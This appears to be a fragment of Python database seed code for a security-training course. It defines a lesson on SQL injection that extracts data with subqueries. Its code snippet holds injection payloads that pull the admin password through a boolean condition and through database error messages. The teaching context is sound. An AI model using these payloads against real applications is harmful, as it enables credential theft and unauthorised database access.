    db.session.add(LessonStep(lesson_id=l5_3.id, order_index=1, kind="sandbox", title="SANDBOX (Guided Enumeration)", prompt="", options=_j([]), correct_answer="", explanation="", hints=_j([])))
    l5_4 = Lesson(module_id=m5.id, order_index=4, title="Extracting Data with Subqueries", narrative="**Narrative**: *Sometimes UNION doesn't work (filtered, wrong column count, etc.). Subqueries offer an alternative path.*\\n**Technique — Data in WHERE clause**:", code_snippet="-- Extract the admin password using a subquery in a boolean context\\n' AND (SELECT password FROM users WHERE username = 'admin') = 'known_value'--\\n\\n-- Or extract via error (if error messages are displayed):\\n' AND 1 = CONVERT(int, (SELECT TOP 1 password FROM users))--\\n-- Error: Conversion failed when converting 'admin_p@ss' to int", code_language="sql", table_data=None)
    db.session.add(l5_4)
